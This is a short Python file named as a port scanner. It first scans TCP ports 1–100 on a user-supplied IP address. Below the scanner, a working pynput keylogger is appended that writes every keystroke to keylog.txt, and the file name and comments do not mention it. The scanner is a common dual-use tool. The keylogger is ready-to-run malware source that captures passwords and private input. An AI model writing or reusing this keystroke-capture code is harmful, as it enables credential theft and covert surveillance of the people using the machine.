# cybertools/port_scanner.py
import socket

# Step 1: Ask user for IP to scan
target = input("Enter IP address to scan: ")

# Step 2: Loop through ports 1 to 100
for port in range(1, 101):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)  # Short wait time

    # Step 3: Try to connect
    result = s.connect_ex((target, port))

    if result == 0:
        print(f"[+] Port {port} is OPEN")
    else:
        print(f"[-] Port {port} is closed")

    s.close()

from pynput.keyboard import Listener

def on_press(key):
    with open("keylog.txt", "a") as f:
        f.write(str(key) + "\n")

with Listener(on_press=on_press) as listener:
    print("[*] Keylogger started. Press Ctrl+C to stop.")
    listener.join()
